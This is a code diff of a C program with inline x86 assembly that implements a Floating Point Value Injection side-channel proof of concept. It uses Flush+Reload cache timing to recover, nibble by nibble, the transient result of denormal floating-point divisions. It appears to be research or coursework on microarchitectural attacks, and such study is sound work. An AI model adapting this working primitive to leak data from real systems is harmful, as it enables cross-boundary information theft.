@@ -15,9 +15,9 @@
 #include "asm.h"
 
 #define NUM_SAMPLES 10000
-#define NUM_ITERATIONS 1000
+#define STRIDE 2048
+#define ITERATIONS 1000
 #define ROUNDS 10
-
 
 uint64_t measure_access(unsigned char* addr, int is_miss) {
     uint64_t min_time = UINT64_MAX;
@@ -75,109 +75,125 @@ uint64_t get_cache_threshold(){
     return threshold;
 }
 
-uint64_t get_reload_time(unsigned char *addr) {
-    mfence();
-    uint64_t start = rdtscp();
-    *(volatile char*)addr;
-    lfence();
-    uint64_t end = rdtscp();
-    
-    uint64_t delta_t = end - start;
-    return delta_t;
-}
 
+void reload_and_measure(unsigned char *reloadbuffer, size_t *cache_hits, uint64_t threshold) {
+    for(int j = 0; j < 16; j++) {
+        mfence();
+        uint64_t start = rdtscp();
+        *(volatile char*)(&reloadbuffer[j * STRIDE]);
+        lfence();
+        uint64_t end = rdtscp();
+        
+        uint64_t reload_time = end - start;
+        if(reload_time < threshold) {
+            cache_hits[j]++;
+        }
+    }
+}
 
 double make_denormal() {
     uint64_t rand_val;
     asm volatile("rdrand %%rax" : "=a"(rand_val));
-    printf("RDRAND generated: 0x%016lx\n", rand_val);
     rand_val &= 0x000FFFFFFFFFFFFFULL;
-    printf("After masking: 0x%016lx\n", rand_val);
 
     return *(double*)&rand_val;
 }
 
 
-
 int main(int argc, char *argv[]) {
-    int CACHE_THRESHOLD = get_cache_threshold();
-    int STRIDE = 4096;
-    int ITERATIONS = 50;
-    int RELOADBUFFER_SIZE = 256 * STRIDE;
+    uint64_t CACHE_THRESHOLD = get_cache_threshold();
+    int RELOADBUFFER_SIZE = 16 * STRIDE;
 
-    unsigned char *reloadbuffer = aligned_alloc(4096, RELOADBUFFER_SIZE);
+    unsigned char *reloadbuffer = mmap(NULL, RELOADBUFFER_SIZE, PROT_READ | PROT_WRITE,
+                                      MAP_ANONYMOUS | MAP_PRIVATE | MAP_POPULATE, -1, 0);
     memset(reloadbuffer, 0, RELOADBUFFER_SIZE);
     
-    printf("CACHE THRESHOLD = %d cycles\n", CACHE_THRESHOLD);
+    printf("CACHE THRESHOLD = %lu cycles\n\n", CACHE_THRESHOLD);
 
     double dX = make_denormal();
     double dY = make_denormal();
     
-    printf("dX = 0x%016lx\n", *(uint64_t*)&dX);
-    printf("dY = 0x%016lx\n", *(uint64_t*)&dY);
-    
+    uint64_t x_hex = *(uint64_t*)&dX;
+    uint64_t y_hex = *(uint64_t*)&dY;
 
-    uint8_t leaked[8];
+    printf("dx = 0x%016lx\n", x_hex);
+    printf("dy = 0x%016lx\n", y_hex);
     
-    for (int byte_index = 0; byte_index < 8; byte_index++) {
-        int all_bytes_hit_tracker[256] = {0};
+    // get architectural result for
+    double architectural_result;
+    asm volatile(
+        "movq %1, %%xmm0   \n\t"
+        "movq %2, %%xmm1   \n\t"
+        "divsd %%xmm1, %%xmm0 \n\t"
+        "movq %%xmm0, %0   \n\t"
+        : "=m"(architectural_result)
+        : "m"(x_hex), "m"(y_hex)
+        : "xmm0", "xmm1"
+    );
+    
+    uint64_t architectural_hex = *(uint64_t*)&architectural_result;
+    printf("architectural result = 0x%016lx\n\n", architectural_hex);
+    
+    // Recover transient result nibble by nibble
+    uint64_t transient_hex = 0;
+    
+    for (int nibble_index = 0; nibble_index < 16; nibble_index++) {
+        size_t cache_hits[16] = {0};
 
         for (int i = 0; i < ITERATIONS; i++) {
             // 1. Flush
-            for (int j = 0; j < 256; j++) {
+             for (int j = 0; j < 16; j++) {
                 clflush(&reloadbuffer[j * STRIDE]);
             }
             mfence();
 
-            // 2. FPVI - TUTTO DENTRO ASSEMBLY!
-            int shift = byte_index * 8;
+            // 2. FPVI 
             asm volatile(
-                "movsd %[x], %%xmm0\n"
-                "movsd %[y], %%xmm1\n"
-                "divsd %%xmm1, %%xmm0\n"
-                "divsd %%xmm1, %%xmm0\n"
-                
-                // Estrai byte e accedi cache SUBITO
-                "movq %%xmm0, %%rax\n"
-                "shr %%cl, %%rax\n"
-                "and $0xFF, %%rax\n"
-                "shl $12, %%rax\n"
-                "add %[buf], %%rax\n"
-                "movb (%%rax), %%al\n"
+                ".rept 5                    \n\t" 
+                "  movq  %[x], %%xmm0       \n\t"  
+                "  movq  %[y], %%xmm1       \n\t"  
+                "  divsd %%xmm1, %%xmm0     \n\t"
+                ".endr                      \n\t"
+                "movq %%xmm0, %%rax         \n\t"
+                "mov  %[shift], %%ecx       \n\t"
+                "shrq %%cl, %%rax           \n\t"
+                "and  $0xf, %%rax           \n\t"  // 4 bits for nibble
+                "shl  $11, %%rax            \n\t"  // STRIDE shift
+                "add  %[buf], %%rax         \n\t"
+                "movb (%%rax), %%al         \n\t"
                 :
-                : [x] "m" (dX), [y] "m" (dY),
-                  [buf] "r" (reloadbuffer),
-                  "c" (shift)
-                : "xmm0", "xmm1", "rax", "memory"
+                : [x]"m"(x_hex),
+                  [y]"m"(y_hex),
+                  [buf]"r"(reloadbuffer),
+                  [shift]"r"(nibble_index * 4)
+                : "rax","rcx","xmm0","xmm1","memory"
             );
-
-            // 3. Reload
-            for(int j = 0; j < 256; j++) {
-                uint64_t reload_time = get_reload_time(&reloadbuffer[j * STRIDE]);
-                if(reload_time < CACHE_THRESHOLD) {
-                    all_bytes_hit_tracker[j]++;
-                }
-            }
+   
+            // 3. Reload and measure
+            reload_and_measure(reloadbuffer, cache_hits, CACHE_THRESHOLD);
         }
 
-        // Find most hit
-        int most_hit_byte = 0;
-        int max = 0;
-        for(int i = 0; i < 256; i++) {
-            if(all_bytes_hit_tracker[i] > max) {
-                max = all_bytes_hit_tracker[i];
-                most_hit_byte = i;
+        // extract the 4 bit architectural nibble with index nibble_index
+        uint8_t architectural_nibble = (architectural_hex >> (nibble_index * 4)) & 0xf;
+        uint8_t transient_nibble = architectural_nibble;
+        
+        
+        //get the most hit that is not the architectural one 
+        for(int j = 0; j < 16; j++) { // exclude the correct cache hit we are not interested in teh architectural one
+            if(cache_hits[j] > 20 && j != architectural_nibble) {
+                transient_nibble = j;
+                break;
             }
         }
-
-        leaked[byte_index] = most_hit_byte;
-        printf("Byte %d: 0x%02x - %.1f%%\n", byte_index, most_hit_byte, 100.0 * max / ITERATIONS);
+        
+        //to reconstruct the transient result
+        transient_hex |= ((uint64_t)transient_nibble) << (nibble_index * 4);
+        
+        printf("Nibble %d:    0x%x (hits=%zu)\n", nibble_index, transient_nibble, cache_hits[transient_nibble]);
     }
     
-    printf("\nTransient: 0x");
-    for(int i = 7; i >= 0; i--) printf("%02x", leaked[i]);
-    printf("\n");
+    printf("\nTRANSIENT LEAKED RESULT: 0x%016lx\n", transient_hex);
 
-    free(reloadbuffer);
+    munmap(reloadbuffer, RELOADBUFFER_SIZE);
     return 0;
 }
